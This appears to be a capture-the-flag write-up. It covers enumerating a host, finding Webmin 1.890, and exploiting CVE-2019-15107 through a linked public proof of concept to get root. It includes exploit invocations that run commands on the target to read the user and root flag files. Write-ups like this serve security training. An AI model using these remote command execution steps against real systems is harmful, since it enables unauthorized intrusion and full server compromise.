
---

## Enumeration

First, I performed a port scan and discovered two open services:

```bash
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

- **Port 22** → SSH
    
- **Port 10000** → Webmin service
    

---

## Service Enumeration

Next, I checked the version of the service running on port `10000`. It was identified as **Webmin 1.890**.

---

## Exploitation

Webmin 1.890 is vulnerable to **CVE-2019-15107**, a remote command execution vulnerability.  
I used the following public exploit to gain access:  
🔗 [Webmin 1.890 Exploit PoC](https://github.com/n0obit4/Webmin_1.890-POC)

---

## Privilege Escalation & Flags

Once the exploit was executed successfully, I obtained **root access** on the target.

### User Flag

```bash
python3 Webmin_exploit.py -host 0.0.0.0 -port 10000 -cmd "ls /home"
python3 Webmin_exploit.py -host 0.0.0.0 -port 10000 -cmd "cat /home/username/user.txt"
```

### Root Flag

```bash
python3 Webmin_exploit.py -host 0.0.0.0 -port 10000 -cmd "cat /root/root.txt"
```

---
